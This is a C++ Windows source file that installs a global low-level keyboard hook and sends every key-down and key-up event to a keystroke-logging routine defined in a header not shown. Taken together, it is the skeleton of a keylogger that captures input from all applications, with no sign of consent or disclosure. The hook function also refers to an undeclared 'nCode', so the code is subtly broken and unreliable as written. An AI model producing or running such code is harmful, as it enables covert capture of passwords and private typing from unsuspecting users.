#include <Windows.h>

#include <iostream>

#include "log_key_input.h"

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
inline bool KeyDownOrUp(WPARAM w_par);
int main() {
  HHOOK hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);

  MSG msg;
  while (GetMessage(&msg, NULL, 0, 0)) {
    TranslateMessage(&msg);
    DispatchMessage(&msg);
  }

  UnhookWindowsHookEx(hKeyboardHook);

  return 0;
}

LRESULT CALLBACK KeyboardProc(int code, WPARAM w_par, LPARAM l_par) {
  if (code >= 0) {
    KBDLLHOOKSTRUCT *kb = (KBDLLHOOKSTRUCT *)l_par;
    if (KeyDownOrUp(w_par)) {
      const auto key = kb->vkCode;
      log_key_input::LogKeyInput(w_par, key);
    }
  }

  return CallNextHookEx(NULL, nCode, w_par, l_par);
}

inline bool KeyDownOrUp(WPARAM w_par) {
  return ((w_par == WM_KEYDOWN || w_par == WM_SYSKEYDOWN) or
          (w_par == WM_KEYUP || w_par == WM_SYSKEYUP));
}
